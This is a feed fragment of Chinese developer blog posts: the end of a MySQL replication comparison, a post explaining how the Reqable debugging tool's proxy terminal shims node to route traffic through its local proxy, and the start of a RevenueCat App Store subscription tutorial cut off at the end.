<li><strong>数据备份</strong>：从库可以用作数据库备份的副本，减少备份对生产环境的影响。</li>
</ul>
<h4 data-id="heading-11"><strong>缺点</strong></h4>
<ul>
<li><strong>延迟</strong>：在异步复制模式下，主库与从库之间的同步有一定延迟，可能导致从库的数据不是实时更新的。</li>
<li><strong>故障切换</strong>：如果主库出现故障，需要手动或自动将某个从库提升为新的主库，进行故障恢复。</li>
</ul>
<hr/>
<h3 data-id="heading-12">3. <strong>MySQL读写分离与主从同步的区别</strong></h3>













































<table><thead><tr><th>特性/概念              </th><th><strong>读写分离</strong>                              </th><th><strong>主从同步</strong>                              </th></tr></thead><tbody><tr><td><strong>定义</strong>              </td><td>将读请求和写请求分开，写请求由主库处理，读请求由从库处理。</td><td>通过复制技术将主库的数据同步到从库。</td></tr><tr><td><strong>工作机制</strong>          </td><td>通过中间件或应用层将读请求发送到从库，写请求发送到主库。</td><td>主库将修改记录到Binlog，从库从Binlog同步数据。</td></tr><tr><td><strong>数据一致性</strong>        </td><td>从库数据可能有延迟，可能存在一致性问题。    </td><td>主库和从库的数据最终一致，但存在同步延迟。</td></tr><tr><td><strong>用途</strong>              </td><td>提高读取性能，分担主库压力。              </td><td>提高数据冗余性和备份能力，提升读取性能。</td></tr><tr><td><strong>实现方式</strong>          </td><td>通过中间件（如ProxySQL、MySQL Router）或应用层控制。</td><td>通过MySQL的复制功能（如异步、半同步、同步复制）。</td></tr><tr><td><strong>优点</strong>              </td><td>提高数据库的读取性能和扩展性，减轻主库负担。</td><td>数据冗余，提升系统可用性和容错能力。</td></tr><tr><td><strong>缺点</strong>              </td><td>从库数据延迟，可能引发一致性问题。        </td><td>主从数据同步有延迟，可能导致主从不一致。</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-13">总结</h3>
<ul>
<li><strong>读写分离</strong>是一种提高MySQL数据库性能和扩展性的方法，主要通过将读请求分发到多个从库来减轻主库压力。</li>
<li><strong>主从同步</strong>则是MySQL的一种数据复制机制，它通过将主库的变更数据同步到从库，从而实现数据冗余、提高系统的高可用性。</li>
<li>它们在提高数据库性能、实现高可用性和故障恢复方面各有优势，但也各自面临一定的挑战（如数据延迟、一致性问题等）。</li>
</ul>
<p>理解和掌握MySQL的读写分离和主从同步技术，能够有效地提升数据库的性能和可用性，尤其是在高并发、大流量的应用场景下。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一个有意思的问题引起了我的反思]]></title>    <link>https://juejin.cn/post/7574726841543442470</link>    <guid>https://juejin.cn/post/7574726841543442470</guid>    <pubDate>2025-11-21T04:52:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574726841543442470" data-draft-id="7574726841543426086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一个有意思的问题引起了我的反思"/> <meta itemprop="keywords" content="前端,后端,测试"/> <meta itemprop="datePublished" content="2025-11-21T04:52:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MegatronKing"/> <meta itemprop="url" content="https://juejin.cn/user/2559318798642792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一个有意思的问题引起了我的反思
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2559318798642792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MegatronKing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:52:38.000Z" title="Fri Nov 21 2025 04:52:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前两天逛V站，看到一个帖子《macos 抓包最佳实践是什么？》，这不是问到我的专业领域了嘛，赶紧点开看看。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a496b49c1a844a3fa8c77dcc17a61494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764305557&amp;x-signature=DHsw1M%2FksCbvECsk0fc1dEnJSH4%3D" alt="image.png" loading="lazy"/></p>
<p>这不巧了，用的正好是Reqable，找对工具就成功了80%，我心里好一阵开心，赶紧看看问题是什么。</p>
<h2 data-id="heading-0">1. 问题的场景</h2>
<p>提问者的场景其实很简单，需要用Reqable抓下AI接口的调用数据。由于国外的几大AI巨头屏蔽了国内IP的访问，在抓包时，程序发起HTTP请求，会先访问Reqable，Reqable再访问AI接口服务器，这是一个代理的过程。但是Reqable并不具备科学上网的功能，所以这个访问会失败。解决方法正如提问者所说配置一个二级代理，让Reqable去访问Clash代理，Clash去访问AI接口的服务器，链路如下：</p>
<pre><code class="hljs language-scss" lang="scss">client -&gt; <span class="hljs-built_in">reqable</span>(port:<span class="hljs-number">9000</span>) -&gt; <span class="hljs-built_in">clash</span>(port: <span class="hljs-number">7890</span>) -&gt; server
</code></pre>
<p>可以看出提问者的网络基础知识非常扎实，找到了正确的方式。接下来是他遇到的问题，浏览器上好使，但是在命令行里面跑程序就不好使了，原因和解决方案他也找到了：</p>
<p>第一个要在命令行里面配置代理环境变量，因为命令行并不会和浏览器一样自动读取系统代理配置，需要手动配置。</p>
<p>第二个是运行的程序不会读取命令行中配置的代理环境变量，还需要改代码强行走代理。从楼下的回复来看，应该是用的Javascript写的程序，需要加入如下代码，读取环境变量中的代理地址。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">setGlobalDispatcher</span>(  
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyAgent</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">HTTP_PROXY</span>)
);
</code></pre>
<p>很明显，这个解决方案是临时的，非常繁琐不方便，所以他有了疑问：抓包最佳实践是什么？爱思考才能有进步，偷懒是科技进步的动力。</p>
<p>相信这个场景很多开发者都会遇到，我们也考虑过这个问题，并给出了解决方案：<code>代理终端</code>。</p>
<h2 data-id="heading-1">2. 代理终端如何用？</h2>
<p>在Reqable顶部本机地址的后面有一个命令行图标，点击一下就可以打开代理终端了（快捷键 Alt + T）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef24ce369d84539a832c7f42cdbb5de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764305557&amp;x-signature=6DbhHNsN66K1cT3mDAGrtM4J%2FBA%3D" alt="image.png" loading="lazy"/></p>
<p>点击之后会打开一个命令行窗口，显示一个帅气的Reqable艺术照。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0facacc2978749348d8cf335d095c890~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764305557&amp;x-signature=N6E3Bvi5D5c3ovfpimxPLiaz7mU%3D" alt="image.png" loading="lazy"/></p>
<p>接下来，只需要直接在这个命令行里面正常运行程序就可以了，不需要配置环境变量，不需要修改代码，Everything is OK！</p>
<p>Reqable支持哪些命令行工具呢，有下面这些：</p>
<ul>
<li>Windows: cmd（默认）、PowerShell和Pwsh。</li>
<li>Mac: Terminal（默认）、iTerm2。</li>
<li>Linux: gnome console（Ubuntu）和konsole（KDE）、xterm。</li>
</ul>
<p>注意：不用默认的命令行，可以图标右键点击修改默认启动的命令行工具。</p>
<p>为什么代理终端可以解决上面的两个问题呢，我们接下来揭晓答案。</p>
<h2 data-id="heading-2">3. 代理终端的原理是什么？</h2>
<p>在启动命令行工具之后，我们会自动执行一段脚本，这个脚本做了下面几件事情。</p>
<p>首先，配置环境变量，把HTTP_PROXY和HTTPS_PROXY设置为Reqable的代理地址，例如 127.0.0.1:9000。</p>
<p>接着，修改PATH环境变量，在运行程序之前先执行我们预设好的程序进行Hook。比如要通过node执行一个JS程序，命令行从PATH中搜索node可执行程序的时候，由于我们的假node在PATH中位置最前面，就先找了这个假node，我们在其中先执行一段逻辑，例如强制网络框架走代理，强制不进行SSL验证等等，然后再调用系统真正的node来运行需要执行的程序。</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-meta">#!/bin/sh</span>
<span class="hljs-built_in">set</span> -e

<span class="hljs-comment"># Find system node path</span>
PATH=<span class="hljs-string">"<span class="hljs-subst">$(printf '%s\n' <span class="hljs-string">"<span class="hljs-variable">$PATH</span>"</span> | sed <span class="hljs-string">"s:<span class="hljs-subst">$(dirname <span class="hljs-string">"<span class="hljs-variable">$0</span>"</span>)</span>\:::g"</span>)</span>"</span>
systemNode=`<span class="hljs-built_in">command</span> -v node`
PATH=<span class="hljs-string">"`dirname "</span><span class="hljs-variable">$0</span><span class="hljs-string">"`:<span class="hljs-variable">$PATH</span>"</span>

<span class="hljs-comment"># Find the override script path</span>
OVERRIDE_SCRIPT_PATH=`<span class="hljs-built_in">dirname</span> <span class="hljs-string">"<span class="hljs-variable">$0</span>"</span>`/override.js

<span class="hljs-comment"># Call system node with the override script</span>
<span class="hljs-string">"<span class="hljs-variable">$systemNode</span>"</span> -r <span class="hljs-string">"<span class="hljs-variable">$OVERRIDE_SCRIPT_PATH</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
</code></pre>
<p>上面是一个shell脚本，在Windows上是bat脚本，内容大同小异。我们插入的逻辑在override.js里面，强制网络框架走代理。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> globalAgent = <span class="hljs-built_in">require</span>(<span class="hljs-string">"global-agent"</span>);
globalAgent.<span class="hljs-title function_">bootstrap</span>();

<span class="hljs-comment">// For node fetch usage</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Undici</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'undici'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ProxyAgent</span> = <span class="hljs-title class_">Undici</span>.<span class="hljs-property">ProxyAgent</span>;
<span class="hljs-keyword">const</span> setGlobalDispatcher = <span class="hljs-title class_">Undici</span>.<span class="hljs-property">setGlobalDispatcher</span>;
<span class="hljs-title function_">setGlobalDispatcher</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyAgent</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">HTTP_PROXY</span>)
);
</code></pre>
<p>最后一步，也是最关键的一步。输入一个帅气的Reqable艺术照，把逼格拉高。</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-string">"echo '______                 _     _      '"</span>,
<span class="hljs-string">"echo '| ___ \               | |   | |     '"</span>,
<span class="hljs-string">"echo '| |_/ /___  __ _  __ _| |__ | | ___ '"</span>,
<span class="hljs-string">"echo '|    // _ \/ _` |/ _` | `_ \| |/ _ \'"</span>,
<span class="hljs-string">"echo '| |\ \  __/ (_| | (_| | |_) | | ___/'"</span>,
<span class="hljs-string">"echo '\_| \_\___|\__. |\__._|_.__/|_|\___|'"</span>,
<span class="hljs-string">"echo '              | |                   '"</span>,
<span class="hljs-string">"echo '              |_| '"</span>,
</code></pre>
<p>手敲上面这段是不可能的，我们找了一个text-to-ascii-art的网站自动生成。</p>
<p>上面是Node自动Hook的原理，而像Python又有很大的不同了，Python不是通过修改PATH环境变量来Hook，而是通过PYTHONPATH来指定路径Hook掉httplib、aiohttp等网络库，具体代码比较多，这里写不下，就不放出来了。</p>
<p>目前Reqable代理终端支持NodeJS、Python和Ruby三种程序的强制代理，当前其他的不需要强制代理的也可以使用。如果大家有其他需要支持的或者方案实现，欢迎在评论区一起讨论交流。</p>
<h2 data-id="heading-3">4. 我在反思什么？</h2>
<p>这么好用的功能为什么大家都不知道，这个问题不得不引起我的反思。说明，我们的文档和教程做得不够好不够细，后面要大大加强这方面的建设。</p>
<p>感谢大家的阅读，欢迎体验我们的产品：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freqable.com" target="_blank" title="https://reqable.com" ref="nofollow noopener noreferrer">新一代API开发工具 - Reqable</a></p>
<p>未来属于Reqable！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RevenueCat 接入 Apple App Store 订阅全流程详解（2025 最新）]]></title>    <link>https://juejin.cn/post/7574725286530121779</link>    <guid>https://juejin.cn/post/7574725286530121779</guid>    <pubDate>2025-11-21T05:19:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574725286530121779" data-draft-id="7574724406306078770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RevenueCat 接入 Apple App Store 订阅全流程详解（2025 最新）"/> <meta itemprop="keywords" content="Flutter,iOS,APP"/> <meta itemprop="datePublished" content="2025-11-21T05:19:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HBLOG"/> <meta itemprop="url" content="https://juejin.cn/user/131597124767479"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RevenueCat 接入 Apple App Store 订阅全流程详解（2025 最新）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597124767479/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HBLOG
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:19:59.000Z" title="Fri Nov 21 2025 05:19:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=http%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2Fimage-16.png" target="_blank" title="http://admin.liuhaihua.cn/wp-content/uploads/2025/11/image-16.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9b6708793b742d39a769f25fc2d3abe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=ZzSMu%2B6NVsCxKgb3QpDZKkYdN10%3D" alt="" loading="lazy"/></a></p>
<p>适用：<strong>Flutter / Swift / Objective-C / React Native / Unity</strong><br/>
场景：上架 App + 内购订阅（月付/年付）+ RevenueCat 统一管理</p>
<h2 data-id="heading-0">一、为什么用 RevenueCat 管理苹果订阅？</h2>
<p>Apple IAP（In-App Purchase）本身非常强大，但开发者常常会遇到：</p>
<ul>
<li>验证票据复杂（Receipt Validation 反作弊）</li>
<li>订阅生效状态难同步（Sandbox 状态混乱）</li>
<li>跨平台权益（iOS + Android）难统一</li>
<li>RevenueCat 能自动管理全部</li>
</ul>
<p>使用 RevenueCat，你可以：</p>
<p>✨ 自动验证订阅（无需自己搭建服务器）<br/>
✨ 自动同步跨平台用户 Pro 状态<br/>
✨ 显示历史账单、取消原因、续费失败原因<br/>
✨ 支持 Offer、价格管理、A/B 测试<br/>
✨ 自动处理 Apple 信号（cancel、renew、billing retry 等）</p>
<p>只需 10 行代码即可完成所有 IAP。</p>
<h2 data-id="heading-1">二、准备工作</h2>
<p>项目</p>
<p>要求</p>
<p>Apple 开发者账号（公司/个人）</p>
<p>已完成银行卡验证</p>
<p>App Store Connect 中已创建 App</p>
<p>不需提交，可是 Draft 状态</p>
<p>已上传一次 build（用于解锁 IAP 功能）</p>
<p>必须，否则找不到 In-App Purchases</p>
<p>RevenueCat 账号</p>
<p>免费版即可</p>
<p>Flutter/Swift 项目已加入 IAP 权限</p>
<p>需开启 In-App Purchase Capability</p>
<h2 data-id="heading-2">三、在 App Store Connect 创建订阅项目（Subscription）</h2>
<p>重要：<strong>必须先创建订阅组（Subscription Group）才能创建订阅产品</strong>。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F1250e617-fa4b-41bf-9dc7-d50879b7f138.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/1250e617-fa4b-41bf-9dc7-d50879b7f138.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35b283edb419443a91b6afea4cbf30fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=IarJMlgDe%2FQzK4dL%2FeRIn1Pb8qs%3D" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-3">步骤 1：进入订阅管理页面</h3>
<p>路径：</p>
<pre><code class="hljs language-sql" lang="sql">App Store <span class="hljs-keyword">Connect</span> → My Apps → 你的 App →
Features → <span class="hljs-keyword">In</span><span class="hljs-operator">-</span>App Purchases → Manage
</code></pre>
<p>点击：</p>
